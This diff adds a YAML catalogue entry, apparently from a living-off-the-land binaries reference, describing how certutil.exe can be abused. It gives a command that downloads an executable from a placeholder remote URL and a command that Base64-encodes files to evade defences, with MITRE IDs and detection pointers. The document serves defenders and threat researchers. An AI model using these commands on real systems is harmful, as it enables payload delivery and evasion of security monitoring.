@@ -1,0 +1,31 @@
+---
+Name: Certutil.exe
+Description: Windows binary used for handling certificates
+Author: Oddvar Moe
+Created: 2018-05-25
+Commands:
+  - Command: certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+    Description: Download and save an executable to disk in the current folder.
+    Usecase: Download file from Internet
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+  - Command: certutil -encode {PATH} {PATH:.base64}
+    Description: Command to encode a file using Base64
+    Usecase: Encode files to evade defensive measures
+    Category: Encode
+    Privileges: User
+    MitreID: T1027.013
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\certutil.exe
+  - Path: C:\Windows\SysWOW64\certutil.exe
+Detection:
+  - Sigma: https://example.com/sigma/certutil_download.yml
+  - IOC: Certutil.exe creating new files on disk
+Resources:
+  - Link: https://example.com/certutil
+Acknowledgement:
+  - Person: Matt Graeber
+    Handle: '@mattifestation'
